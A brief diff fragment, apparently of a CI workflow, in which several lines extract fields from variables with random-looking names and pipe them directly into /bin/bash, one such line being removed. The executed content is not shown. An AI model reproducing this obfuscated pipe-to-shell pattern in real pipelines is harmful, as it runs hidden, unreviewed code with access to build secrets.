@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$msnk329" | jq -r .tb5704 | /bin/bash
           printf '%s' "$qbqs944" | jq -r .tncw14 | /bin/bash
           printf '%s' "$eewaa060" | jq -r .k5209 | /bin/bash
-          printf '%s' "$t42" | jq -r .xmpb50 | /bin/bash
 
       - name: Save output
         if: always()
